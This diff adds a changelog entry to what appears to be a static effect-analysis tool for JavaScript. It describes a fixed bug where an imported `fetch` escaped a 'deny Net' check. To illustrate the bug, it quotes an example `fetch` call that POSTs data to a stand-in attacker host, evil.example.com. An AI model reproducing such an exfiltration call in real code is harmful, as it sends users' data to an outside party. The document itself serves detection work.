@@ -8,6 +8,22 @@ report bytes or gate verdicts (regenerate baselines / expect verdict changes acr
 
 ## Unreleased
 
+- **⚠ CARDINAL SIN — `fetch` reached through an IMPORT was treated as the project's own.** The shadow
+  guard asks "is this `fetch` declared in a project file?", and for `import { fetch } from
+  "node-fetch-native/proxy"` the declaration is the IMPORT SPECIFIER — which lives in the importing
+  file, a project file. So the guard said yes and withheld Net, and `deny Net` certified
+  `await fetch("https://evil.example.com/collect", { method: "POST", body: data })`.
+  **The shape is a MONOTONICITY VIOLATION**: without `node_modules` the call reported `Unknown`
+  (honest — the import did not resolve); INSTALLING the dependency turned it into nothing. More
+  information, less safe answer. FOUND ON REAL CODE: giget's `_utils.download` — a function whose whole
+  job is an HTTP download — reported `['Fs']` alone with its 474 packages installed, and now reports Net
+  across all 7 functions on that path.
+  The guard now keys on the MODULE SPECIFIER, not file-set membership: a relative import is the
+  project's own module by definition, a bare specifier is somebody else's `fetch`. That reworking was
+  itself forced by a CONTROL — keyed on `projectFiles`, scanning a single FILE left a sibling `./mock`
+  outside the analyzed set and a project's own mock fabricated Net. The specifier is what κ already
+  classifies on, and it does not move with the scan's shape.
+
 - **`worker_threads.postMessageToThread` is Ipc.** Node 22's module-level send read PURE while every
   other spelling of the same channel was charged — `parentPort.postMessage`, `worker.postMessage`, a
   `MessagePort`'s `.postMessage`, `receiveMessageOnPort`. The κ name pattern was anchored, so the newer
